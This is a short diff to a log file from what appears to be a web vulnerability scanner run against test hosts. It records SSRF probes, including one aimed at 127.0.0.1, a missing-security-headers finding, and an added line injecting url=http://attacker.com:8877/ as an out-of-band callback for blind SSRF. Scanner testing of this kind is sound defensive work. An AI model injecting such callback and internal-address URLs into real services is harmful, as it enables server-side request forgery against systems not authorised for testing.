@@ -246,3 +246,4 @@
 2026-06-01 12:26:19,984 [INFO] SSRFValidator: probing https://example.test/?url=https://example.com with parameters ['url']
 2026-06-01 12:26:19,985 [WARNING] SSRFValidator: exception-based confirmation via url=http://127.0.0.1 (Connection refused)
 2026-06-01 12:26:21,808 [INFO] LoggingValidator: headers present=[] missing=['X-Content-Type-Options', 'Content-Security-Policy', 'X-Frame-Options', 'Referrer-Policy', 'Permissions-Policy', 'Strict-Transport-Security'] for https://example.test
+2026-06-06 15:53:32,894 [INFO] SSRFValidator: OOB probe for blind SSRF — injecting url=http://attacker.com:8877/test_scan_test_finding_99ZpravYg6jt
